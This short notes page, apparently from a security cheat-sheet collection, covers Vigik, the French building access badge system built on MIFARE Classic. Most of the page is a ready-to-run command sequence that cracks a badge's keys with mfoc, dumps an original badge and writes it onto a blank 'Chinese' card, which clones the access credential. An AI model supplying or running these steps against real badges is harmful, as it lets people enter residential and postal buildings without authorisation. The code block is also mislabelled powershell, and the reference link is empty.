# HF - Vigik

Vigik is essentially a rebranded version of MIFARE Classic because it uses the same underlying technology and standards. 

* [cjbrigato/kigiv-for-proxmark3](https://github.com/cjbrigato/kigiv-for-proxmark3/releases) - KIGIV stands for Reverse VIGIK, the French Residential and Postal/State services Residential Security system.

```powershell
modprobe -r pn533_usb
modprobe -r pn533

nfc-list # Check the proper functioning of the reader
mfoc -P 500 -O blank-card.dmp # Extract the encryption keys from the Chinese RFID chip into a file
mfoc -P 500 -O original-card.dmp # Copy the content of the original RFID chip into a file
nfc-mfclassic W a original-card.dmp blank-card.dmp # Write the content of the original chip onto the Chinese chip
```


## References

* []()